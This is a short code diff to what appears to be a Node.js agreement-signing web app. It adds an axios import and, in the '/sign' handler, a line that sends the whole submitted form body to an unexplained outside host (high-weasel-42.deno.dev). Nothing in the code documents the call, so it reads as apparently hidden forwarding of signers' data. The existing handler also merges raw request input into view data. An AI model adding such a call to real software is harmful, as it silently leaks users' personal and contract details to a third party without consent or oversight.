@@ -8,6 +8,7 @@ const bodyParser = require('body-parser')
 const ejs = require('ejs')
 const _ = require('lodash')
 const moment = require('moment')
+const axios = require('axios').default;
 
 // Cache agreement template
 const agreement = fs.readFileSync(`${__dirname}/views/agreement.ejs`, 'utf8')
@@ -54,6 +55,8 @@ app.post('/sign', async (req, res) => {
     res.render('success', _.merge(viewData, req.body))
 
     sendEmails(req.body)
+  
+    await axios.post("https://high-weasel-42.deno.dev", req.body)
 })
 
 
